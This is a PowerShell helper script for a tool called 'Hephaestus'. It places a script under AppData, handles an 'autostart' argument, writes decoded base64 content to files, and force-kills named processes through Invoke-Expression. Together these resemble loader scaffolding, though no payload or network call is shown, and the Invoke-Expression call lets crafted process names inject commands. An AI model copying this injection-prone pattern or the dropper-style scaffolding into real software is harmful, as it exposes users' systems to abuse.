
function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
}

function Utf8NoBom {
    param (
        [string]$data,
        [string]$file
    )

    # Create a StreamWriter to write without BOM
    $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
    $streamWriter.Write($data)
    $streamWriter.Close()

    # Forcefully overwrite the file to ensure no BOM is present
    # Read back the written file as byte array
    $writtenContent = [System.IO.File]::ReadAllBytes($file)

    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
    if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
        # Remove the BOM bytes
        $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
    }

    # Write back the content without BOM
    [System.IO.File]::WriteAllBytes($file, $writtenContent)
}


function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $HephaestusFolder = Join-Path $appDataPath 'Hephaestus'
    return $HephaestusFolder
}

function Get-HephaestusPath {
    $HephaestusFolder = Get-HephaestusFolder
    $scriptName = 'Hephaestus' + '.' + 'ps1'
    $HephaestusPath = Join-Path $HephaestusFolder $scriptName
    return $HephaestusPath
}

function ExtractEmbedding {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $decodedBytes = [Convert]::FromBase64String($inContent)
    [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
}

$scriptArgs = $args
function Test-Autostart 
{
    $argString = $scriptArgs -join ' '
    if ($argString -like "*autostart*")
    {
        return $true;
    }
    return $false
}
function Test-Gui
{
    $argString = $scriptArgs -join ' '
    if ($argString -like "*guimode*")
    {
        return $true;
    }
    return $false
}


writedbg "-------------------"
if (Test-Autostart -eq $true)
{
    writedbg "AutoStart"
    Start-Sleep -Seconds 5
}
writedbg "-------------------"

function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}